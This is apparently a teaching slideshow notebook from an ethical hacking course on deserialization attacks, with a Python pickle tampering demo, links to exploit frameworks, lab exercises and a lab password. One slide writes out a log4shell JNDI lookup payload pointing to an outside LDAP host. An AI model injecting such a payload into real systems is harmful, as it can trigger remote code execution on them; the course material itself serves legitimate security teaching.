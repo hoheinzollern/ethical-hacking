{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Deserialization attacks\n",
    "\n",
    "## Ethical hacking 2022\n",
    "\n",
    "## Alessandro Bruni"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "# References\n",
    "\n",
    "- [Marshalling Pickles (Slides + Video)](http://frohoff.github.io/appseccali-marshalling-pickles/)\n",
    "- [ysoserial: Deserialization attack framework for Java](https://github.com/frohoff/ysoserial)\n",
    "- [ysoserial.net: .NET deserialization attack framework](https://github.com/pwntester/ysoserial.net)\n",
    "- [Are you my type - blackhat 2012](https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2012/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)\n",
    "- [Remote code execution on Microsoft Exchange](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)\n",
    "- [Log4j vulnerability explained](https://www.youtube.com/watch?v=w2F67LbEtnk)\n",
    "- https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "# Intro\n",
    "\n",
    "- serialization/deserialization is a widely-used concept in modern languages for storing objects (structured data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "# example in Python:\n",
    "import pickle\n",
    "\n",
    "class A:\n",
    "    def __init__(self, x):\n",
    "        print(\"construct \" + x)\n",
    "        self.x = x\n",
    "    \n",
    "    def __del__(self):\n",
    "        print(\"destruct \" + self.x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "construct hello\n",
      "destruct hello\n"
     ]
    }
   ],
   "source": [
    "# Serialize the class\n",
    "a = A(\"hello\")\n",
    "a_bytes = pickle.dumps(a)\n",
    "del(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x80\\x04\\x95%\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x01A\\x94\\x93\\x94)\\x81\\x94}\\x94\\x8c\\x01x\\x94\\x8c\\x05hello\\x94sb.'\n",
      "destruct hella\n"
     ]
    }
   ],
   "source": [
    "# Deserialize the class\n",
    "print(a_bytes)\n",
    "a_bytes = a_bytes[:-5] + b'a' + a_bytes[-4:]\n",
    "a = pickle.loads(a_bytes)\n",
    "del(a)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## The problem?\n",
    "\n",
    "Object integrity is lost once you pass it through some untrusted channel\n",
    "- give it to the user to store some temporary data (think authentication cookies stored this way)\n",
    "- send over the network\n",
    "- store it in a database"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## The solution?\n",
    "\n",
    "- sanity checks required: e.g. cryptographically sign serialized objects to maintain integrity\n",
    "- Java (e.g. RMI) does type checking: the receiving end deserializes the object, checks the type, if the type does not match then destroy the object"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## OWASP resources\n",
    "\n",
    "- [A08:2021 – Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)\n",
    "- [Deserialization cheatsheet](https://www.owasp.org/index.php/Deserialization_Cheat_Sheet)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Exercise: do Natas 26\n",
    "\n",
    "http://natas26.natas.labs.overthewire.org/\n",
    "\n",
    "```\n",
    "username = natas26\n",
    "password = oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Remote Code Execution with destructors\n",
    "\n",
    "- RMI receives an object of a class present in your classpath\n",
    "- constructs the object, checks the type (mismatch), destroys the object\n",
    "- the destructor executes arbitrary code from the user\n",
    "- if anywhere in your classpath you have an object that executes arbitrary code upon destruction, you have a path to RCE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Exercise: Deserialize to B()\n",
    "\n",
    "[Serial.java](./code/3-deserialization/Serial.java)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Exercise: Serial Killer\n",
    "\n",
    "- download ysoserial\n",
    "- go to \n",
    "https://github.com/archang31/aacs4-writeups/tree/master/BinaryExploitation/SerialKiller"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## log4shell\n",
    "\n",
    "```\n",
    "${jndi:ldap://example.com}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Exercise: exploit log4shell\n",
    "\n",
    "- https://www.youtube.com/watch?v=iI9Dz3zN4d8\n",
    "- https://github.com/LiveOverflow/log4shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "# JEP 290\n",
    "\n",
    "- [JEP 290](http://openjdk.java.net/jeps/290)\n",
    "- [Attacking Java RMI services after JEP 290](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## CVE-2020-0688: RCE on MS Exchange\n",
    "\n",
    "https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Related vulnerabilities: injection\n",
    "\n",
    "- OWASP page [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)\n",
    "\n",
    "Includes\n",
    "- shell injection\n",
    "- SQL/NoSQL injection\n",
    "- cross site scripting\n",
    "\n",
    "![top10change](https://owasp.org/Top10/assets/mapping.png)"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "interpreter": {
   "hash": "e7370f93d1d0cde622a1f8e1c04877d8463912d04d973331ad4851f04de6915a"
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
